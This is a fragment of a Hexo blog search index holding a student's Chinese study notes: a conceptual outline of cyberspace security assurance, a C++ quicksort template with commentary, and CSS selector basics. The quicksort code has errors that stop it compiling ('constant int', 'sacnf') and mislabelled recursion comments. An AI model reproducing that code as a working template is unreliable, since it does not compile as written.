            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网安保障</title>
      <link href="/2023/10/09/%E7%BD%91%E5%AE%89%E4%BF%9D%E9%9A%9C/"/>
      <url>/2023/10/09/%E7%BD%91%E5%AE%89%E4%BF%9D%E9%9A%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="网安保障"><a href="#网安保障" class="headerlink" title="网安保障"></a>网安保障</h1><h2 id="知识域一："><a href="#知识域一：" class="headerlink" title="知识域一："></a>知识域一：</h2><h3 id="一、信息"><a href="#一、信息" class="headerlink" title="一、信息"></a>一、信息</h3><h5 id="1-信息概念"><a href="#1-信息概念" class="headerlink" title="1. 信息概念"></a>1. 信息概念</h5><p>- </p><h5 id="2-信息的性质"><a href="#2-信息的性质" class="headerlink" title="2. 信息的性质"></a>2. 信息的性质</h5><ul><li>依附性</li><li>动态性</li><li>可处理性</li><li>共享性</li><li>可传递性</li><li>异步性</li><li>可交换性</li><li>可伪性</li></ul><h3 id="二、网络空间安全的基本属性"><a href="#二、网络空间安全的基本属性" class="headerlink" title="二、网络空间安全的基本属性"></a>二、网络空间安全的基本属性</h3><p>保密性、完整性、可用性</p><h5 id="1-网络空间安全的特征与范畴"><a href="#1-网络空间安全的特征与范畴" class="headerlink" title="1. 网络空间安全的特征与范畴"></a>1. 网络空间安全的特征与范畴</h5><ul><li>特征<ul><li>是系统的安全</li><li>动态的安全</li><li>无边界的安全</li><li>非传统的安全</li></ul></li><li>范畴</li></ul><h5 id="2-网络空间安全发展阶段"><a href="#2-网络空间安全发展阶段" class="headerlink" title="2. 网络空间安全发展阶段"></a>2. 网络空间安全发展阶段</h5><p>…</p><ul><li><h2 id="CS（三位一体）-网络防御-网络攻击"><a href="#CS（三位一体）-网络防御-网络攻击" class="headerlink" title="CS（三位一体）- 网络防御- 网络攻击"></a>CS（三位一体）<br>- 网络防御<br>- 网络攻击</h2></li></ul><h2 id="2-知识域二：网络空间安全保障"><a href="#2-知识域二：网络空间安全保障" class="headerlink" title="2.知识域二：网络空间安全保障"></a>2.知识域二：网络空间安全保障</h2><h3 id="一、网络安全保障定义"><a href="#一、网络安全保障定义" class="headerlink" title="一、网络安全保障定义"></a>一、网络安全保障定义</h3><ul><li><p>防止信息泄露、修改、破坏</p></li><li><p>网络空间安全保障是一种立体的保障</p></li><li><p>网络空间安全保障VS信息安全（ppt）</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全知识，网安技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安保障 </tag>
            
            <tag> 网安技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重点知识掌握</title>
      <link href="/2023/10/09/%E9%87%8D%E7%82%B9%E7%9F%A5%E8%AF%86%E6%8E%8C%E6%8F%A1/"/>
      <url>/2023/10/09/%E9%87%8D%E7%82%B9%E7%9F%A5%E8%AF%86%E6%8E%8C%E6%8F%A1/</url>
      
        <content type="html"><![CDATA[<p><img src="/2023/10/09/%E9%87%8D%E7%82%B9%E7%9F%A5%E8%AF%86%E6%8E%8C%E6%8F%A1/image-20231009085053451.png" alt="image-20231009085053451"></p>]]></content>
      
      
      <categories>
          
          <category> 安全知识，网安技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安技术 </tag>
            
            <tag> 章节重点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>快排</title>
      <link href="/2023/10/08/%E5%BF%AB%E6%8E%92/"/>
      <url>/2023/10/08/%E5%BF%AB%E6%8E%92/</url>
      
        <content type="html"><![CDATA[<h1 id="快排思想"><a href="#快排思想" class="headerlink" title="快排思想"></a>快排思想</h1><ul><li>分治</li><li>确定分界点：<code>q[l],q[r],q[(r+l)/2] 或随机</code></li><li>调整区间***：右边全部&lt;&#x3D;x;左边全部&gt;&#x3D;x</li><li>递归处理左边和右边</li></ul><h1 id="调整区间"><a href="#调整区间" class="headerlink" title="调整区间"></a>调整区间</h1><ul><li>暴力求解：额外开辟两个数组用来存放q中大于等于x的和小于等于x的</li><li>双指针：保证i指针左边（不包括i）所有数小于等于x；j指针右边（不包括j）所有数大于等于x</li></ul><h1 id="快排模板"><a href="#快排模板" class="headerlink" title="快排模板"></a>快排模板</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">constant <span class="type">int</span> N =<span class="number">100010</span>;</span><br><span class="line"><span class="type">int</span> q[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">quick_sort</span><span class="params">(<span class="type">int</span> q[],<span class="type">int</span> l,<span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l&gt;=r) <span class="keyword">return</span>;</span><br><span class="line">    <span class="type">int</span> x = q[l], i=l<span class="number">-1</span>, j=r+<span class="number">1</span>; <span class="comment">//设定超出边界值的指针,后续先移动再比较</span></span><br><span class="line">    <span class="keyword">while</span> (i &lt;j)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">do</span> i++; <span class="keyword">while</span>(q[i]&lt;x);</span><br><span class="line">        <span class="keyword">do</span> j--; <span class="keyword">while</span>(q[j]&gt;x);</span><br><span class="line">        <span class="keyword">if</span> (i&lt;j) <span class="built_in">swap</span>(q[i],q[j]);</span><br><span class="line">        <span class="comment">/*&#123;</span></span><br><span class="line"><span class="comment">            int t=q[i];</span></span><br><span class="line"><span class="comment">            q[i] = q[j];</span></span><br><span class="line"><span class="comment">            q[j] = t;</span></span><br><span class="line"><span class="comment">        &#125;*/</span> <span class="comment">//没有swap函数的时候</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">quick_sort</span>(q,l,j);<span class="comment">//右边</span></span><br><span class="line">    <span class="built_in">quick_sort</span>(q,j+<span class="number">1</span>,r);<span class="comment">//左边</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;i++) <span class="built_in">sacnf</span>(<span class="string">&quot;%d&quot;</span>,&amp;q[i]);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">quick_sort</span>(q,<span class="number">0</span>,n<span class="number">-1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt;n;i ++) <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,q[i]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>理解：此算法并没有按照教材中显示的不停用边界值交换，这减少了交换的次数，也表示出，最终一轮迭代结束后，分界线处不一定是边界值</p><p>可行原因：两句dowhile表明：i（不包含i）的左侧一定&lt;x；j（不包含j）的右侧一定&gt;x；后面的swap能够保证此时的i&lt;&#x3D;x，j&gt;&#x3D;x，这也让循环中下一次先do有了条件，do了以后又满足本段第一行条件（两句…）。</p><p>递归边界的理解：当大while结束以后，i&gt;&#x3D;j（323i&gt;j）</p><p>​用j：递归右边（大于等于x）j的右侧不能包含i，取j+1</p><p>​同理，用i：递归左边不能包含j，取i-1</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 算法学习，蓝桥杯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 蓝桥杯，排序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Css基础</title>
      <link href="/2023/09/29/Css%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/09/29/Css%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="css"><a href="#css" class="headerlink" title="css"></a>css</h1><h4 id="1、行内式"><a href="#1、行内式" class="headerlink" title="1、行内式"></a>1、行内式</h4><blockquote><p>直接写在HTML标签的后面，再通过标签属性style来引入的</p></blockquote><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span> =<span class="string">&#x27;width:200px;&#x27;</span>&gt;</span>内容<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="2、内嵌式"><a href="#2、内嵌式" class="headerlink" title="2、内嵌式"></a>2、内嵌式</h4><blockquote><p>将css代码单独放在一个style标签中，然后通过css<a href="https://so.csdn.net/so/search?q=%E9%80%89%E6%8B%A9%E5%99%A8&spm=1001.2101.3001.7020">选择器</a>来选择HTML元素</p></blockquote><ul><li>语法：选择器{属性名：属性值}</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>内容<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"> //放在head中，放在title下面</span></span><br><span class="line"><span class="language-css">  <span class="selector-tag">div</span>&#123;<span class="attribute">color</span>:red;&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="3、外链式（最常用）"><a href="#3、外链式（最常用）" class="headerlink" title="3、外链式（最常用）"></a>3、外链式（最常用）</h4><blockquote><p>将css代码单独的放在一个文件中，再通过link标签引入</p></blockquote><ul><li>link标签<ul><li>rel &#x3D; ‘stylesheet’ 样式表，不可缺少</li><li>href &#x3D; ‘style.css’ 样式表的地址、路径</li><li>type &#x3D; ‘text&#x2F;css’ 类型，可以省略不写</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;link rel = &#x27;stylesheet&#x27; href = &#x27;style.css&#x27; type = &#x27;text/css&#x27;&gt;</span><br><span class="line">1</span><br></pre></td></tr></table></figure><h4 id="4、导入式-了解就可以，没有用到过"><a href="#4、导入式-了解就可以，没有用到过" class="headerlink" title="4、导入式(了解就可以，没有用到过)"></a>4、导入式(了解就可以，没有用到过)</h4><blockquote><p>将CSS代码单独放在一个文件中，再通过style标签进行引入</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">  @import &#x27;地址&#x27;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><ul><li><p>推荐在head当中使用link的方式引入css</p></li><li><p>import方式要写在style的第一行</p></li></ul><h1 id="CSS选择器"><a href="#CSS选择器" class="headerlink" title="CSS选择器"></a>CSS选择器</h1><h3 id="1-三类选择器"><a href="#1-三类选择器" class="headerlink" title="1. 三类选择器"></a>1. 三类选择器</h3><ul><li><h4 id="基础选择器"><a href="#基础选择器" class="headerlink" title="基础选择器"></a>基础选择器</h4><ul><li><p>元素选择器——一组元素</p><ul><li>同一元素可以多个类</li><li>h1.red——&gt;class&#x3D;red（vscode语法）</li><li>h1#red——&gt;id&#x3D;red</li></ul></li><li><p>类选择器——class</p><ul><li>伪类选择器，描述不同状态【标签：伪类】</li><li><a href="https://www.w3school.com.cn/tiy/t.asp?f=css_link_1">W3School TIY Editor</a></li></ul></li><li><p>id选择器</p></li><li><p>通篇符选择器</p><ul><li>对网页中的所有元素设定</li><li>初始化网页布局会用到</li></ul></li><li><p>属性选择器</p><ul><li><img src="/2023/09/29/Css%E5%9F%BA%E7%A1%80/image-20230927203130255.png" alt="image-20230927203130255"></li></ul></li><li><p>示例代码：</p><p>- </p>  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSS 选择器<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: blanchedalmond;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">p</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>:yellowgreen;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">a</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-decoration</span>: none;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>:yellow;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.black</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>:black;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.pink</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>:deeppink;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.red</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>:red;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.bold</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-weight</span>: <span class="number">800</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#lg</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>:turquoise;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-attr">[href]</span>&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>:aqua;</span></span><br><span class="line"><span class="language-css">            </span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-attr">[href=<span class="string">&quot;http://www.scu.edu.cn&quot;</span>]</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-attr">[href*=<span class="string">&quot;edu.cn&quot;</span>]</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>:chocolate;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-attr">[href$=<span class="string">&quot;.com&quot;</span>]</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>:<span class="number">200%</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-attr">[class~=<span class="string">&quot;border&quot;</span>]</span>&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>:yellowgreen;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        &lt;!-- 这条规则不会生效 --&gt;</span></span><br><span class="line"><span class="language-css">        <span class="selector-attr">[class|=<span class="string">&quot;border&quot;</span>]</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-style</span>: italic;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-attr">[class |=<span class="string">&quot;dash&quot;</span>]</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-weight</span>: <span class="number">900</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>CSS选择器<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>css选择器分为两类<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>1.基础选择器<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>2.符合选择器<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>基础选择器<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>1.1 元素选择器<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>1.2 类选择器<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>1.3 ID选择器<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>1.4 属性选择器<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>1.5 全局选择器<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>1.1 元素选择器<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span>&gt;</span>根据元素的标记名选择<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.scu.edu.cn&quot;</span>&gt;</span>新浪<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">     <span class="tag">&lt;<span class="name">h2</span>&gt;</span>1.2 类选择器<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;black&quot;</span>&gt;</span>黑色字体<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;red&quot;</span>&gt;</span>红色字体<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;pink&quot;</span>&gt;</span>粉红色<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;bold&quot;</span>&gt;</span>粗体<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span>&gt;</span>我们通过类可以设定预设的样式<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">     <span class="tag">&lt;<span class="name">h2</span>&gt;</span>1.3 ID选择器<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span>&gt;</span>通过ID选择器可以唯一选定一个元素<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;lg&quot;</span>&gt;</span>我是ID选择器<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span>需要确保id值是唯一的<span class="tag">&lt;/<span class="name">strong</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">     <span class="tag">&lt;<span class="name">h2</span>&gt;</span>1.4 属性选择器<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span>&gt;</span>基本用法：[属性=“属性值”]<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span>&gt;</span>但是还有很多六种变种：<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>1.4.1 [属性名]<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>1.4.2 [属性名*=&quot;属性值部分字符串&quot;]<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>1.4.3 [属性名^=&quot;属性值部分字符串&quot;]<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>1.4.4 [属性名$=&quot;属性值部分字符串&quot;]<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>1.4.5 [属性名~=&quot;多个属性值的某个属性值&quot;]<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>1.4.6 [属性名|=&quot;-设定属性的前面字符串&quot;]<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"></span><br><span class="line">     <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.scu.edu.cn&quot;</span>&gt;</span>四川大学<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.uestc.edu.cn&quot;</span>&gt;</span>电子科技大学<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.wiki.com&quot;</span> <span class="attr">class</span>=<span class="string">&quot;border dash&quot;</span>&gt;</span>维基<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.baidu.com&quot;</span> <span class="attr">class</span>=<span class="string">&quot;dash-border&quot;</span>&gt;</span>属性测试<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">     </span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>1.5 *：通用或全局选择器<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span>&gt;</span>&quot;*&quot;选择器用于选择页面中的全部元素，一般不独立使用<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span>&gt;</span>一般用在组合选择器中，和其他选择器组合使用<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">     </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><h4 id="复合选择器"><a href="#复合选择器" class="headerlink" title="复合选择器"></a>复合选择器</h4><ul><li>交选择器<ul><li>h1.class</li><li>h1#id</li></ul></li><li>并选择器<ul><li>标签一，标签二</li></ul></li></ul></li><li><h4 id="位置选择器"><a href="#位置选择器" class="headerlink" title="位置选择器"></a>位置选择器</h4><ul><li><p><img src="/2023/09/29/Css%E5%9F%BA%E7%A1%80/image-20230927204118013.png" alt="image-20230927204118013"></p><p>标签二是一的后代标签，全部</p></li><li><p><img src="/2023/09/29/Css%E5%9F%BA%E7%A1%80/image-20230927204203931.png" alt="image-20230927204203931"></p><p>标签2是标签1的儿子节点</p></li><li><p><img src="/2023/09/29/Css%E5%9F%BA%E7%A1%80/image-20230927204317615.png" alt="image-20230927204317615"></p></li><li><p>兄弟选择节点，相邻节点——p+p，p的所有相邻p节点</p><ul><li><p>相邻兄弟只会影响下面的p标签的样式，不影响上面兄弟的样式。</p></li><li><pre><code class="html">&lt;style type=&quot;text/css&quot;&gt;    li + li &#123;        color:red;    &#125;&lt;/style&gt;&lt;div&gt;  &lt;ul&gt;    &lt;li&gt;List item 1&lt;/li&gt;    &lt;li&gt;List item 2&lt;/li&gt;    &lt;li&gt;List item 3&lt;/li&gt;  &lt;/ul&gt;&lt;/div&gt;</code></pre></li></ul></li><li><p><img src="/2023/09/29/Css%E5%9F%BA%E7%A1%80/20200819151017875.png#pic_center" alt="![图片描述][1]"></p></li><li><p><img src="/2023/09/29/Css%E5%9F%BA%E7%A1%80/image-20230927205517625.png" alt="image-20230927205517625"></p><p>不一定是紧邻</p></li></ul></li></ul><h3 id="2-css常见申明"><a href="#2-css常见申明" class="headerlink" title="2. css常见申明"></a>2. css常见申明</h3><h4 id="背景颜色"><a href="#背景颜色" class="headerlink" title="背景颜色"></a>背景颜色</h4><ul><li><p><img src="/2023/09/29/Css%E5%9F%BA%E7%A1%80/image-20230927205938144.png" alt="image-20230927205938144"></p></li><li><p><img src="/2023/09/29/Css%E5%9F%BA%E7%A1%80/image-20230927210044556.png" alt="image-20230927210044556"></p></li><li><p>颜色设置：color</p></li></ul><h4 id="文字段落设置"><a href="#文字段落设置" class="headerlink" title="文字段落设置"></a>文字段落设置</h4><ul><li><p><img src="/2023/09/29/Css%E5%9F%BA%E7%A1%80/image-20230927211511945.png" alt="image-20230927211511945"></p></li><li><p><img src="/2023/09/29/Css%E5%9F%BA%E7%A1%80/image-20230927211531465.png" alt="image-20230927211531465"></p></li><li><p>相对单位</p><ul><li><p>rem是根em（root em）的缩写。rem是和根元素关联的，不依赖当前元素。不管你在文档中的什么地方使用这个单位，1.2rem的计算值是相等的，等于1.2倍的根元素的字号大小。下面的示例代码中，声明了根元素的字号大小，并在嵌套的无序列表中使用rem声明字号大小。</p></li><li><p><strong>概括地说，在排版属性中 em 单位的意思是“父元素的字体大小”</strong>。带有 <code>ems</code> 类的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/ul">&#96;&#96;</a> 内的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/li">&#96;&#96;</a> 元素从它们的父元素中获取大小。因此，每一个连续的嵌套级别都会逐渐变大，因为每个嵌套的字体大小都被设置为 <code>1.3em</code>——是其父嵌套字体大小的 1.3 倍。</p><p><strong>概括地说，rem 单位的意思是“根元素的字体大小”</strong>。（“根 em”的 rem 标准。）<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/ul">&#96;&#96;</a> 内的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/li">&#96;&#96;</a> 元素和一个 rems 类从根元素（<code>&lt;html&gt;</code>）中获取它们的大小。这意味着每一个连续的嵌套层都不会不断变大。</p><p>但是，如果你在 CSS 中更改 <code>&lt;html&gt;</code> 字体大小，你将看到所有其他相关内容都发生了更改，包括 <code>rem</code> 和 <code>em</code> 大小的文本。</p></li></ul></li><li><p><img src="/2023/09/29/Css%E5%9F%BA%E7%A1%80/image-20230927213223564.png" alt="image-20230927213223564"></p></li><li><p><img src="/2023/09/29/Css%E5%9F%BA%E7%A1%80/image-20230927213306054.png" alt="image-20230927213306054"></p><ul><li><img src="/2023/09/29/Css%E5%9F%BA%E7%A1%80/image-20230927213328049.png" alt="image-20230927213328049"></li><li>“，”分隔符，做选择，如果客户机上无法显示，可以换一种字体</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术栈学习 </category>
          
          <category> web应用开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css </tag>
            
            <tag> web </tag>
            
            <tag> 选择器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>论文阅读方法</title>
      <link href="/2023/09/25/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E6%96%B9%E6%B3%95/"/>
